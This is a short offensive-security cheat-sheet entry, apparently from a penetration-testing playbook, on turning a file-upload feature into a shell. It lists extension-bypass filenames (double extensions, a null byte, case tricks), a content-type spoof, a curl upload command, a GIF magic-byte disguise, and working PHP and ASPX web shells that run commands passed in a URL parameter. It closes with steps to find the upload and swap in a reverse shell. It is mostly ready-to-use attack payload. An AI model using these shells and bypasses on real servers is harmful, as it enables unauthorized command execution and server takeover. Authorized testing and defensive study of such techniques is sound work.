---
id: file-upload-shell
title: File Upload → Shell
stage: initial-access
tags: [windows, linux, web]
tools:
  - "curl -F 'file=@shell.php;type=image/jpeg' http://$TARGET/upload"
leads_to:
  - web-shell
  - rev-shell
---

## Extension Bypass

```
shell.php.jpg
shell.php%00.jpg
shell.pHp
shell.php5
shell.phtml
shell.shtml
```

## Content-Type Bypass (change in Burp)

```
Content-Type: image/jpeg
```

## Magic Bytes (add GIF header to PHP file)

```
GIF89a;
<?php system($_GET['cmd']); ?>
```

## Minimal Web Shells

```php
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
```

```aspx
<%@ Page Language="C#" %><%System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%>
```

## Notes

Find the uploaded file path from the response or by directory busting under `/uploads/`, `/files/`, `/images/`. Access the file, run `?cmd=id`, then swap in a reverse shell payload.

If the server strips extensions, try double extension (`shell.php.jpg`) and see if only the last known extension is validated. Null byte injection (`%00`) only works on PHP < 5.3.4.
